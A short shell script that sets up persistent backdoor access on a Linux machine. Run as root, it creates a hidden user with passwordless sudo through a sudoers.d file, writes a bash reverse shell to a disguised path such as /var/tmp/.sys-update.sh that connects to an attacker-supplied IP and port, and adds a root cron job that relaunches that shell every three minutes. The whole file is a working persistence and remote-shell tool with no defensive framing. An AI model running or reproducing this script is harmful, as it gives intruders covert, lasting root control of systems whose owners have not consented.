#!/bin/sh

# This script:
# - Creates a sudo user with password
# - Grants passwordless sudo via sudoers.d
# - Creates a reverse shell script in /var/tmp/.sys-update.sh
# - Sets a root cron job to run it every 3 minutes
#
# Change IP and port below as needed.

if [ "$(id -u)" -ne 0 ]; then
  echo "Run as root"
  exit 1
fi

USER_NAME="$1"
USER_PASS="$2"
ATTACK_IP="$3"
ATTACK_PORT="$4"
CRON_SCRIPT_PATH="$5"

# Create user with no home, no group, bash shell
useradd -M -N -s /bin/bash "$USER_NAME"

# Set password non-interactively
echo "${USER_NAME}:${USER_PASS}" | chpasswd

# Add user to sudo group
usermod -aG sudo "$USER_NAME"

# Hide sudo config via sudoers.d
SUDO_FILE="/etc/sudoers.d/${USER_NAME}"
echo "${USER_NAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDO_FILE"
chmod 440 "$SUDO_FILE"

# Create reverse shell script
mkdir -p "$(dirname "$CRON_SCRIPT_PATH")"

cat > "$CRON_SCRIPT_PATH" <<EOF
#!/bin/bash
bash -i >& /dev/tcp/${ATTACK_IP}/${ATTACK_PORT} 0>&1
EOF

chmod +x "$CRON_SCRIPT_PATH"

# Install root crontab to run every 3 minutes, preserving existing entries
CRON_TMP=$(mktemp)
crontab -l 2>/dev/null > "$CRON_TMP"
echo "*/3 * * * * $CRON_SCRIPT_PATH" >> "$CRON_TMP"
crontab "$CRON_TMP"
rm -f "$CRON_TMP"
